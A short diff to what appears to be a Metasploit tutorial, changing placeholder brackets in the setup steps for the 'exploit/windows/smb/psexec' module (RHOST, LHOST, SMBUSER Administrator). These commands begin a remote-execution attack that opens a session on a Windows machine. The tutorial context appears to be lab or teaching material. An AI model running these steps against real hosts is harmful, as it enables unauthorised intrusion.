@@ -183,9 +183,9 @@ Once your terminal header is `msf >`, run the following one at a time:
 
 <pre>use exploit/windows/smb/psexec</pre>
 
-<pre>set RHOST <Your Windows IP></pre>
+<pre>set RHOST [Your Windows IP]</pre>
 
-<pre>set LHOST <Your Linux IP></pre>
+<pre>set LHOST [Your Linux IP]</pre>
 
 <pre>set SMBUSER Administrator</pre>
 
